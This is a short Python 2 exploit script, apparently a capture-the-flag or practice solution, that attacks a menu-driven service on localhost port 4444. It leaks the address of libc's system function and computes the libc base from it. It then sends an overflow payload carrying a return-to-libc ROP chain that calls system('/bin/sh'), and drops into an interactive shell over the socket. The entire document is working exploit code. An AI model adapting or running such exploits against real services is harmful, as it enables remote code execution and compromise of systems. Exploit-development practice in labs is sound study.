import struct, socket, telnetlib, time

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 4444))

s.recv(1024)

# get system
s.send("2\n")
time.sleep(0.5)
s.recv(1024)
s.send("system\n")
data = s.recv(1024)

# output looks like: Symbol system: 0x00007FFFF785D210
system = data.split()[2]
print "system is: " + system
system = int(system, 16)

system_offset  = 0x00045210
bin_sh   = 0x00178d0f
rdi_ret  = 0x00022a72

libc = system - system_offset

sploit = "A" * 8
sploit += struct.pack("<Q", libc + rdi_ret)
sploit += struct.pack("<Q", libc + bin_sh)
sploit += struct.pack("<Q", system)

raw_input("ready to launch ....")

s.send("3\n")
s.recv(1024)

s.send("%d\n" % (len(sploit)+1))
s.sendall(sploit+"\n")

print "[*] Shell "
t = telnetlib.Telnet()
t.sock = s
t.interact()
